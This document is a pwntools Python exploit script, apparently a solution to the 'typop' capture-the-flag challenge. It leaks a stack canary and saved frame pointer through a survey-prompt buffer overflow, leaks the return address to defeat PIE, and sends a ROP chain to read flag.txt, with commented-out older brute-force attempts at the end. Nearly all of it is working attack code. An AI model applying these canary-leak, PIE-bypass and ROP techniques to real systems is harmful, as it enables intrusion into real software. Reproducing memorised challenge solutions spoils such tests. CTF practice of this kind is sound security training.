from pwn import *
from icecream import ic

context.terminal = ['tmux', 'splitw', '-h', '-d']
context.arch = 'amd64'
context.log_level = 'warning'

MODE = 2

elf = ELF('chall', checksec=0)
elf.address = 0x555555554000
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=0)

if MODE == 0:
    p = gdb.debug(elf.path, aslr=False, gdbscript='\n'.join([
        # 'b *0x55555555538e',
        # 'b *0x5555555553f4',
        # 'b *0x5555555553f9',
        'b *0x5555555552ba',
        'c',
        # 'x/24x 0x7fffffffdc78',
    ])) # type: process
elif MODE == 1:
    p = process(elf.path)
else: 
    p = remote('typop.chal.idek.team', 1337)


# Round 1
p.recvuntil(b'Do you want to complete a survey?\n')
p.sendline(b'y')
p.recvuntil(b'Do you like ctf?\n')
p.sendline(b'A'*10)
p.recvuntil(b'You said: ')

answer1 = p.recvuntil(b'Aww :( ', drop=True)
stack_canary = b'\x00' + answer1[11:18]
rbp = answer1[18:24].ljust(8, b'\x00')
ic(stack_canary.hex())
ic(rbp.hex())
ic(answer1[10:].hex())

p.recvuntil(b'Can you provide some extra feedback?\n')
payload1 = b'B'*10 + stack_canary
ic(len(payload1))
p.sendline(payload1)


# Round 2
p.recvuntil(b'Do you want to complete a survey?\n')
p.sendline(b'y')
p.recvuntil(b'Do you like ctf?\n')
p.sendline(b'C'*10 + b'D'*8 + rbp[:6] + b'E')

p.recvuntil(b'You said: ')
answer2 = p.recvuntil(b'Aww :( ', drop=True)
rip = answer2[26:32].ljust(8, b'\x00')
ic(answer2)
ic(answer2[10:].hex())
ic(rip.hex())
rip_i = u64(rip)
ic(hex(rip_i))
elf.address = rip_i - (0x555555555447 - 0x555555554000) # calculated with Ghidra - home 0x555555554000
ic(hex(elf.address))

# ROP time
p.recvuntil(b'Can you provide some extra feedback?\n')
rop = ROP(elf)
new_ip = elf.address + (0x5555555552ac - 0x555555554000)
ic(hex(new_ip))
rop.call(new_ip)
# rop.call(elf.symbols['win'])

location = p64(u64(rbp)+74)

payload2 = (b'F'*10 + stack_canary + location + rop.chain() + b'flag.txt\x00')#.ljust(0x5a, b'H')
ic(payload2.hex())
p.sendline(payload2)

# Round 3


p.interactive() 






#====================
# OLD
#====================

# result = p.recvall()
# if (len(result) > 0):
#     print(result)
# else:
#     print('failed')


# # Without PIE just jump straight to win
# print(p64(elf.symbols['win']))
# p.sendline(b'y' + b'0'*9 + stack_canary + b'A'*8 + p64(elf.symbols['win']))

# With PIE - just just have to hope the address of win is XXXXXXXXX5249
# We have to bruteforce the MSB byte (5) - note this is preset at 5 because then it works when ASLR is disabled for testing
# p.send(b'y' + b'0'*9 + stack_canary + b'A'*8 + b'\x49\x52')
# p.stdin.close() # force read() to not append a newline
# p.sendline(b'y' + b'0'*9 + stack_canary + b'A'*8 + b'\x49\x52')
